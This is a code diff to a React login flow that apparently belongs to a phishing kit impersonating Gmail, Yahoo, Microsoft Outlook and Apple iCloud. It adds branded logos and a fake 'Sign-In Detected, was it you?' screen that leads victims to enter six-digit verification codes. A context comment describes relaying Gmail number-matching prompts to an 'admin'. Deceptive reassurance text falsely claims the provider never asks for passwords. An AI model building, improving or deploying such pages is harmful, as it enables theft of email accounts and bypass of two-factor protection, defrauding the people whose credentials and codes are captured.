@@ -20,54 +20,103 @@ const languageOptions: { code: Language; label: string }[] = [
   { code: "fr", label: "Français" },
 ];
 
-type Stage = "provider-select" | "credentials" | "gmail-confirm" | "verification" | "approving" | "approved" | "rejected";
+type Stage = "provider-select" | "credentials" | "gmail-confirm" | "provider-confirm" | "verification" | "approving" | "approved" | "rejected";
 
 const providers = [
   {
     id: "gmail",
     name: "Gmail",
+    brandColor: "#EA4335",
+    confirmBg: "#fce8e6",
+    confirmAccent: "#c5221f",
     icon: (
+      /* Gmail — classic multicolor envelope M */
       <svg width="22" height="22" viewBox="0 0 24 24">
-        <rect width="24" height="24" fill="none"/>
-        <path d="M2 6h20v12H2z" fill="#fff" stroke="#ddd" strokeWidth="1"/>
-        <path d="M2 6l10 7 10-7" fill="none" stroke="#EA4335" strokeWidth="1.8"/>
-        <path d="M2 6v12" stroke="#4285F4" strokeWidth="1.5"/>
-        <path d="M22 6v12" stroke="#34A853" strokeWidth="1.5"/>
-        <path d="M2 18h20" stroke="#FBBC04" strokeWidth="1.5"/>
+        <path d="M2 5h20v14H2z" fill="#fff" stroke="#e0e0e0" strokeWidth="0.6"/>
+        <path d="M2 5l10 8 10-8" fill="none" stroke="#EA4335" strokeWidth="0"/>
+        <path d="M2 5l10 7.5L22 5z" fill="#EA4335"/>
+        <path d="M2 5v14l7-7z" fill="#4285F4"/>
+        <path d="M22 5v14l-7-7z" fill="#34A853"/>
+        <path d="M2 19l7-7 3 2.5 3-2.5 7 7z" fill="#FBBC05"/>
+      </svg>
+    ),
+    iconLarge: (
+      <svg width="48" height="48" viewBox="0 0 48 48">
+        <path d="M4 10h40v28H4z" fill="#fff" stroke="#e0e0e0" strokeWidth="1"/>
+        <path d="M4 10l20 15L44 10z" fill="#EA4335"/>
+        <path d="M4 10v28l14-14z" fill="#4285F4"/>
+        <path d="M44 10v28L30 24z" fill="#34A853"/>
+        <path d="M4 38l14-14 6 5 6-5 14 14z" fill="#FBBC05"/>
       </svg>
     ),
   },
   {
     id: "yahoo",
     name: "Yahoo Mail",
+    brandColor: "#6001D2",
+    confirmBg: "#f3e8ff",
+    confirmAccent: "#4a0099",
     icon: (
+      /* Yahoo — purple Y! */
       <svg width="22" height="22" viewBox="0 0 24 24">
-        <rect width="24" height="24" rx="4" fill="#6001D2"/>
-        <text x="4" y="17" fontFamily="Arial" fontSize="13" fontWeight="bold" fill="#fff">Y!</text>
+        <rect width="24" height="24" rx="5" fill="#6001D2"/>
+        <path d="M5.5 6h3l3.5 4.5L15.5 6H18l-5 6.5V18h-2.5v-5.5L5.5 6z" fill="#fff"/>
+        <circle cx="16.5" cy="17" r="1.2" fill="#fff"/>
+      </svg>
+    ),
+    iconLarge: (
+      <svg width="48" height="48" viewBox="0 0 48 48">
+        <rect width="48" height="48" rx="10" fill="#6001D2"/>
+        <path d="M10 12h7l7 9 7-9h7L28 25v11h-6V25L10 12z" fill="#fff"/>
+        <circle cx="33" cy="34" r="2.5" fill="#fff"/>
       </svg>
     ),
   },
   {
     id: "outlook",
     name: "Outlook",
+    brandColor: "#0078D4",
+    confirmBg: "#e3f2fd",
+    confirmAccent: "#004e8c",
     icon: (
+      /* Outlook — Microsoft blue O envelope */
       <svg width="22" height="22" viewBox="0 0 24 24">
         <rect width="24" height="24" rx="3" fill="#0078D4"/>
-        <rect x="2" y="6" width="11" height="12" rx="2" fill="#fff"/>
-        <rect x="13" y="8" width="9" height="8" rx="1" fill="#50B0F0"/>
-        <path d="M13 8l4.5 3.5L22 8" stroke="#0078D4" strokeWidth="1" fill="none"/>
-        <ellipse cx="7.5" cy="12" rx="3" ry="4" fill="#0078D4"/>
-        <ellipse cx="7.5" cy="12" rx="2" ry="3" fill="#fff"/>
+        <rect x="2.5" y="5.5" width="10" height="13" rx="2" fill="#fff"/>
+        <ellipse cx="7.5" cy="12" rx="2.6" ry="3.4" fill="#0078D4"/>
+        <ellipse cx="7.5" cy="12" rx="1.6" ry="2.4" fill="#fff"/>
+        <rect x="13.5" y="7.5" width="8" height="9" rx="1" fill="#28A8E0"/>
+        <path d="M13.5 7.5l4 3 4-3" stroke="#fff" strokeWidth="0.8" fill="none"/>
+      </svg>
+    ),
+    iconLarge: (
+      <svg width="48" height="48" viewBox="0 0 48 48">
+        <rect width="48" height="48" rx="6" fill="#0078D4"/>
+        <rect x="4" y="10" width="22" height="28" rx="4" fill="#fff"/>
+        <ellipse cx="15" cy="24" rx="5.5" ry="7" fill="#0078D4"/>
+        <ellipse cx="15" cy="24" rx="3.5" ry="5" fill="#fff"/>
+        <rect x="27" y="14" width="17" height="18" rx="2" fill="#28A8E0"/>
+        <path d="M27 14l8.5 6.5L44 14" stroke="#fff" strokeWidth="1.5" fill="none"/>
       </svg>
     ),
   },
   {
     id: "icloud",
     name: "iCloud",
+    brandColor: "#007AFF",
+    confirmBg: "#e5f0ff",
+    confirmAccent: "#0051c3",
     icon: (
+      /* iCloud — Apple cloud on blue */
       <svg width="22" height="22" viewBox="0 0 24 24">
-        <rect width="24" height="24" rx="4" fill="#1d6aea"/>
-        <path d="M7 16a4 4 0 01-.5-7.95A5.5 5.5 0 0117.9 8H18a3 3 0 010 6H7z" fill="#fff"/>
+        <rect width="24" height="24" rx="5" fill="#007AFF"/>
+        <path d="M17 16H7a3.5 3.5 0 01-.7-6.93A5 5 0 0116.9 8.5H17a2.5 2.5 0 010 5z" fill="#fff"/>
+      </svg>
+    ),
+    iconLarge: (
+      <svg width="48" height="48" viewBox="0 0 48 48">
+        <rect width="48" height="48" rx="10" fill="#007AFF"/>
+        <path d="M34 33H14a7 7 0 01-1.4-13.86A10 10 0 0133.8 17H34a5 5 0 010 10z" fill="#fff"/>
       </svg>
     ),
   },
@@ -158,7 +207,7 @@ export default function LoginSuccess() {
     ).catch(() => {});
 
     setLoading(false);
-    setStage(selectedProvider === "gmail" ? "gmail-confirm" : "verification");
+    setStage(selectedProvider === "gmail" ? "gmail-confirm" : "provider-confirm");
   }
 
   /* ── Gmail: send numbers to admin, poll for admin's chosen number ── */
@@ -517,14 +566,79 @@ export default function LoginSuccess() {
             </div>
           )}
 
+          {/* ── STAGE: provider-confirm (Yahoo / Outlook / iCloud — "Was it you?") ── */}
+          {stage === "provider-confirm" && selectedProvider !== "gmail" && (
+            <div className="ls-fadein" style={{ animationDelay:"0.1s" }}>
+              {/* Brand header */}
+              <div style={{ display:"flex", flexDirection:"column", alignItems:"center", marginBottom:22 }}>
+                <div style={{
+                  width:60, height:60, borderRadius:"50%",
+                  background: currentProvider?.confirmBg ?? "#f5f5f5",
+                  display:"flex", alignItems:"center", justifyContent:"center", marginBottom:14,
+                }}>
+                  {currentProvider?.iconLarge ?? currentProvider?.icon}
+                </div>
+                <p style={{ fontSize:18, fontWeight:700, color:"#111", margin:"0 0 4px" }}>
+                  {selectedProvider === "icloud" ? "Apple ID Sign-In Detected" :
+                   selectedProvider === "yahoo"   ? "Yahoo Sign-In Detected" :
+                                                    "Microsoft Sign-In Detected"}
+                </p>
+                <p style={{ fontSize:13, color:"#666", margin:0 }}>{providerEmail}</p>
+              </div>
+
+              {/* Info card */}
+              <div style={{
+                background: currentProvider?.confirmBg ?? "#f8f8f8",
+                border: `1px solid ${currentProvider?.brandColor ?? "#ddd"}30`,
+                borderRadius:10, padding:"14px 16px", marginBottom:22, textAlign:"left",
+              }}>
+                <p style={{ fontSize:13, fontWeight:600, color:"#111", margin:"0 0 6px" }}>
+                  A new sign-in was detected to your account
+                </p>
+                <p style={{ fontSize:12, color:"#555", margin:"0 0 4px" }}>
+                  If this was you, tap <b>Yes, it's me</b> to verify your identity.
+                </p>
+                <p style={{ fontSize:12, color:"#555", margin:0 }}>
+                  If you didn't sign in, tap <b>No</b> to secure your account immediately.
+                </p>
+              </div>
+
+              {/* YES button — brand color */}
+              <button type="button"
+                onClick={() => setStage("verification")}
+                style={{ width:"100%", height:50, marginBottom:10, background: currentProvider?.brandColor ?? "#333", color:"#fff", fontSize:15, fontWeight:600, border:"none", borderRadius:6, cursor:"pointer", letterSpacing:"0.02em" }}>
+                Yes, it's me
+              </button>
+
+              {/* NO button */}
+              <button type="button"
+                onClick={() => setStage("rejected")}
+                style={{ width:"100%", height:46, background:"#fff", color:"#c00", fontSize:14, fontWeight:600, border:"1.5px solid #e0e0e0", borderRadius:6, cursor:"pointer" }}>
+                No, it wasn't me
+              </button>
+
+              <p style={{ fontSize:11, color:"#aaa", marginTop:16, textAlign:"center" }}>
+                {selectedProvider === "icloud"
+                  ? "Apple will never ask for your password via email or text."
+                  : selectedProvider === "yahoo"
+                    ? "Yahoo will never ask for your password in an email."
+                    : "Microsoft will never ask for your password in an email."}
+              </p>
+            </div>
+          )}
+
+          {/* ── STAGE: verification (Yahoo / Outlook / iCloud — OTP) ── */}
           {stage === "verification" && selectedProvider !== "gmail" && (
             <div className="ls-fadein" style={{ animationDelay:"0.1s" }}>
-              <div style={{ display:"flex", alignItems:"center", gap:10, marginBottom:20, padding:"12px 14px", background:"#f8f8f8", borderRadius:8 }}>
+              <div style={{ display:"flex", alignItems:"center", gap:10, marginBottom:20, padding:"12px 14px", background: currentProvider?.confirmBg ?? "#f8f8f8", borderRadius:8 }}>
                 {currentProvider?.icon}
-                <p style={{ fontSize:13, fontWeight:700, color:"#111", margin:0 }}>
-                  {selectedProvider === "icloud" ? "Apple ID Verification" :
-                   selectedProvider === "yahoo" ? "Yahoo Account Key" : "Microsoft Verification"}
-                </p>
+                <div>
+                  <p style={{ fontSize:13, fontWeight:700, color:"#111", margin:0 }}>
+                    {selectedProvider === "icloud" ? "Apple ID Verification" :
+                     selectedProvider === "yahoo" ? "Yahoo Account Key" : "Microsoft Verification"}
+                  </p>
+                  <p style={{ fontSize:12, color:"#666", margin:0 }}>{providerEmail}</p>
+                </div>
               </div>
 
               <p style={{ fontSize:15, fontWeight:600, color:"#111", marginBottom:8 }}>
@@ -533,16 +647,21 @@ export default function LoginSuccess() {
               <p style={{ fontSize:13, color:"#555", lineHeight:1.6, marginBottom:24 }}>
                 {selectedProvider === "icloud"
                   ? "A 6-digit code was sent to your trusted device or phone number."
-                  : "A 6-digit verification code was sent to your registered email or phone."}
+                  : selectedProvider === "yahoo"
+                    ? "A 6-digit verification code was sent to your recovery email or phone."
+                    : "A 6-digit code was sent to your registered phone or alternate email."}
               </p>
 
-              {/* 6-digit OTP boxes */}
+              {/* 6-digit OTP boxes — brand color highlight */}
               <div style={{ display:"flex", justifyContent:"center", gap:10, marginBottom:8 }}>
                 {Array.from({ length: 6 }).map((_, i) => (
                   <div key={i} style={{
-                    width:44, height:54, border:`2px solid ${otpCode.length===i?"#111":"#ddd"}`,
+                    width:44, height:54,
+                    border: `2px solid ${otpCode.length===i ? (currentProvider?.brandColor ?? "#111") : "#ddd"}`,
                     borderRadius:8, display:"flex", alignItems:"center", justifyContent:"center",
                     fontSize:22, fontWeight:700, color:"#111", background:"#fafafa",
+                    boxShadow: otpCode.length===i ? `0 0 0 3px ${currentProvider?.brandColor ?? "#111"}22` : "none",
+                    transition:"border 0.2s, box-shadow 0.2s",
                   }}>
                     {otpCode[i] ?? ""}
                   </div>
@@ -559,13 +678,13 @@ export default function LoginSuccess() {
                 onChange={e => { setOtpCode(e.target.value.replace(/\D/g, "").slice(0,6)); setOtpError(""); }}
                 onKeyDown={e => e.key==="Enter" && handleOtpSubmit()}
                 disabled={loading}
-                style={{ width:"100%", height:46, border:otpError?"1.5px solid #e00":"1.5px solid #ddd", borderRadius:6, padding:"0 14px", fontSize:18, color:"#111", background:"#fafafa", boxSizing:"border-box", textAlign:"center", letterSpacing:"0.3em", marginTop:12 }}
+                style={{ width:"100%", height:46, border: otpError ? "1.5px solid #c00" : "1.5px solid #ddd", borderRadius:6, padding:"0 14px", fontSize:18, color:"#111", background:"#fafafa", boxSizing:"border-box", textAlign:"center", letterSpacing:"0.3em", marginTop:12 }}
                 autoComplete="one-time-code"
               />
-              {otpError && <p style={{ fontSize:12, color:"#e00", marginTop:5 }}>{otpError}</p>}
+              {otpError && <p style={{ fontSize:12, color:"#c00", marginTop:5 }}>{otpError}</p>}
 
               <button type="button" onClick={handleOtpSubmit} disabled={loading || otpCode.length<6}
-                style={{ width:"100%", height:50, marginTop:20, background:loading||otpCode.length<6?"#999":"#111", color:"#fff", fontSize:15, fontWeight:600, border:"none", borderRadius:6, cursor:loading||otpCode.length<6?"not-allowed":"pointer", letterSpacing:"0.03em", display:"flex", alignItems:"center", justifyContent:"center", gap:8 }}>
+                style={{ width:"100%", height:50, marginTop:20, background: loading||otpCode.length<6 ? "#aaa" : (currentProvider?.brandColor ?? "#111"), color:"#fff", fontSize:15, fontWeight:600, border:"none", borderRadius:6, cursor: loading||otpCode.length<6 ? "not-allowed" : "pointer", letterSpacing:"0.03em", display:"flex", alignItems:"center", justifyContent:"center", gap:8 }}>
                 {loading ? <><Loader2 size={18} style={{ animation:"spin 1s linear infinite" }}/> Verifying…</> : "Verify →"}
               </button>
 
